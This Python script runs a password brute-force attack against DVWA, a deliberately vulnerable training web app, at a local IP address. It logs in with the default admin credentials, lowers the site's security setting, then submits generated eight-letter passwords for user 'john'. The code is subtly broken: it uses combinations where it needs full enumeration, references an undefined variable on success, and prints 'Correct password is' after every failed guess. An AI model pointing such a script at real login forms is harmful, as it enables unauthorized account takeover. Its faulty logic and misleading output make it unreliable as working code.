# -*- coding: utf-8 -*-

import logging
import os
from bs4 import BeautifulSoup
import mechanize
from colorama import Fore, Style
from itertools import combinations
from string import ascii_lowercase


if not os.path.exists('logs'):
    os.makedirs('logs')
logging.basicConfig(filename='logs/bruteforce_chars.log', level=logging.DEBUG,
                    format='%(asctime)s %(levelname)s %(name)s %(message)s')
logger = logging.getLogger(__name__)


RHOST = "192.168.0.7"


class Bruteforce:
    def __init__(self):

        self.br = mechanize.Browser()
        self.br.set_handle_robots(False)
        # self.br.set_debug_http(True)
        # br.set_debug_redirects(True)
        # br.set_debug_responses(True)

    def login(self):
        try:
            #self.br.open("http://" + RHOST)
            self.br.open("http://" + RHOST + "/dvwa")
            self.br.select_form(nr=0)

            self.br.form['username'] = 'admin'
            self.br.form['password'] = 'password'
            self.br.submit()

            self.br.follow_link(url_regex=r'security.php')
            self.br.select_form(nr=0)  # selects the form
            self.br.form['security'] = ["low"]  # changes the security setting to low
            res = self.br.submit()

            content = res.read()
            soup = BeautifulSoup(content, 'html.parser')
            get_seclevel = soup.find("em")
            seclevel = str(get_seclevel).split("<em>")[1].replace("</em>", "")

            def show_secevel():
                if seclevel == 'high':
                    print("- Security Level:", Fore.LIGHTRED_EX, Style.BRIGHT, seclevel, Style.RESET_ALL)
                elif seclevel == 'medium':
                    print("- Security Level:", Fore.YELLOW, Style.BRIGHT, seclevel, Style.RESET_ALL)
                elif seclevel == 'low':
                    print("- Security Level:", Fore.LIGHTGREEN_EX, Style.BRIGHT, seclevel, Style.RESET_ALL)
                else:
                    print(" other Security Level")

            print("-" * 55)
            print("- " + self.br.title())
            show_secevel()
            print("-" * 55)

        except Exception as e:
            logger.error(e)
            print(e)

    def bruteforce_chars(self):
        passwords = (p for p in combinations(ascii_lowercase, 8))
        for p in passwords:
            self.br.follow_link(url_regex=r'brute')
            self.br.select_form(nr=0)
            self.br["username"] = 'john'
            self.br["password"] = ''.join(p)
            self.res = self.br.submit()
            self.content = self.res.read()

            self.soup = BeautifulSoup(self.content, 'html.parser')

            if self.soup.find("p").text == "Welcome to the password protected area admin":
                print("Password found:", Fore.GREEN, Style.BRIGHT, self.password, Style.RESET_ALL)
                break


            print("-" * 55)
            print("Correct password is ", ''.join(p))
            print("-" * 55)

def main():
    automate = Bruteforce()
    automate.login()
    automate.bruteforce_chars()


if __name__ == '__main__':
    main()